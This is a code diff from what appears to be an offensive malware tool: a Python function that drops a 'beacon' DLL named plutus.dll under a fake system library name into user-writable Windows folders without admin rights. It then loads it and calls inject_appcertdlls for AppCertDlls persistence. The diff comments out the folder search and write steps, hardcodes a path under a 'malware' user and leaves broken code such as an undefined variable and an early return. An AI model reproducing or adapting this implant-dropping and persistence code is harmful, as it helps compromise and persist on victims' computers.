@@ -263,6 +263,20 @@ def mv_dll_plutus_noadmin(beacon_path="plutus.dll", fake_name="VCRUNTIME140_1.dl
     Drop plutus.dll into a user-writable WindowsApps folder (no admin, no takeown/icacls)
     Prioritized targets = folders that are naturally writable by normal users in 2025
     """
+
+    path = glob.glob("C:\\Users\\malware\\AppData\\Local\\Packages\\PythonSoftwareFoundation*\\**\\site-packages\\src\\plutus.dll",)
+    print (path)
+    
+
+    # base = os.path.expanduser(r"~\\AppData\\Local\\Packages\\PythonSoftwareFoundation*")
+
+    # ** is supported in glob since Python 3.5 when recursive=True
+    # paths = glob.glob(
+        # os.path.join(base, "**", "plutus.dll"),
+        # recursive=True
+    # )    
+
+
     # with open("plutus.dll", "rb") as f:
     #     data = f.read()
     
@@ -293,40 +307,43 @@ def mv_dll_plutus_noadmin(beacon_path="plutus.dll", fake_name="VCRUNTIME140_1.dl
     #     # 5. Skype (still preinstalled on many images)
     #     "Microsoft.SkypeApp_*",
     # ]
-    with open("plutus.dll", "rb") as f:
+    print (paths)
+
+    return 
+    with open(paths[0], "rb") as f:
         data = f.read()
 
-    windowsapps = glob.glob("C:/Program Files/Common Files/**/**/**/")
-    if not windowsapps:
-        print("[-] WindowsApps folder not found")
-        return False
+    # windowsapps = glob.glob("C:/Program Files/Common Files/**/**/**/")
+    # if not windowsapps:
+    #     print("[-] WindowsApps folder not found")
+    #     return False
 
-    target_dir = None
-    # for pattern in priority_folders:
-    for folder in windowsapps:
-        try:
-            test_file = open(f"{folder}.write_test.tmp", "wb")
-            test_file.write(b"test")
-            test_file.close()
-            target_dir = folder
-            print(f"[+] Found writable folder: {folder}")
-            inject_appcertdlls([folder])
+    # target_dir = None
+    # # for pattern in priority_folders:
+    # for folder in windowsapps:
+    #     try:
+    #         test_file = open(f"{folder}.write_test.tmp", "wb")
+    #         test_file.write(b"test")
+    #         test_file.close()
+    #         target_dir = folder
+    #         print(f"[+] Found writable folder: {folder}")
+    #         inject_appcertdlls([folder])
 
-            break
-        except (PermissionError, OSError):
-            continue
-        # if target_dir:
-            # break
+    #         break
+    #     except (PermissionError, OSError):
+    #         continue
+    #     # if target_dir:
+    #         # break
 
-    if not target_dir:
-        print("[-] No writable WindowsApps folder found")
-        return False
+    # if not target_dir:
+    #     print("[-] No writable WindowsApps folder found")
+    #     return False
 
     try:
-        location = f"{folder}/plutus.dll"
-        with open(location, "wb") as dll:
-            dll.write(data) 
-        dll = ctypes.WinDLL(location)  # assuming it's already reflectively loaded or on disk
+        # location = f"{folder}/plutus.dll"
+        # with open(location, "wb") as dll:
+        #     dll.write(data) 
+        dll = ctypes.WinDLL(path)  # assuming it's already reflectively loaded or on disk
         # Define the function signature (this is hypothetical - actual signature varies by version)
         CreateProcessNotify = dll.CreateProcessNotify
         CreateProcessNotify.argtypes = []  # usually no arguments
